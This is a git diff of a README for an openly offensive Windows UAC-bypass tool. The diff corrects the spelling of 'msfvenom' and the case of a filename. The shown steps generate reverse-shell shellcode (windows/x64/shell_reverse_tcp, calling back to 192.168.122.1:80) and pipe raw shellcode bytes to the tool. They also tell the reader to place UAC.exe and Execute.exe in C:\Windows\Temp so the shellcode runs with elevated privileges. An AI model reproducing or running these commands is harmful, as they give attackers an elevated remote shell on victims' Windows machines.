@@ -5,7 +5,7 @@ Finally after 3 days of fails I can now bypass UAC automatically and get a eleva
 # Steps!
 - Generate shellcode for 64/32 bit depending upon your PC bitness.
 ```bash
-sfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.122.1 LPORT=80 -a x64 -f csharp -b "\x00\x0a\x0d"
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.122.1 LPORT=80 -a x64 -f csharp -b "\x00\x0a\x0d"
 ```
 - Now run the [UAC.exe](../exe/UAC.exe) executable and send shellcode over the tcp port
 ```bash
@@ -15,7 +15,7 @@ python -c 'print "\x48\x31\xc9\x48\x81\xe9\xc6\xff\xff\xff\x48\x8d\x05\xef\xff\x
 
 # Things to take care of!
 
-- Download [UAC.exe](../exe/UAC.exe) in `C:\Windows\Temp` and download [Execute.exe](../exe/execute.exe) also in `C:\Windows\Temp` since its actually execute.exe which extracts the shellcode from shared memory and executes it in elevated context.
+- Download [UAC.exe](../exe/UAC.exe) in `C:\Windows\Temp` and download [Execute.exe](../exe/Execute.exe) also in `C:\Windows\Temp` since its actually execute.exe which extracts the shellcode from shared memory and executes it in elevated context.
 - The exe are 64 compiled for 64 bit
 - Enjoy!
 
